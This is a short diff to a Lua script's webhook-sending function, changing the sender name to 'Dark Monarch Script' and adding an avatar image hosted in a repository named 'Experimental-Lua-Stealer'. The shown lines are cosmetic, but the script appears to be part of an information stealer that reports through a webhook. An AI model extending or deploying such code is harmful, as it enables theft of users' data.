@@ -37,7 +37,8 @@ end
 --== Webhook Senders ==--
 local function sendWebhookEmbedOpen(title, description)
     local payload = {
-        username = "DarkMonarchScript",
+        username = "Dark Monarch Script",
+		avatar_url = "https://raw.githubusercontent.com/Hasponix/Experimental-Lua-Stealer/refs/heads/main/file_00000000848461f8a7581f1fb5625f04.png",
         embeds = {{
             title = title,
             description = description,
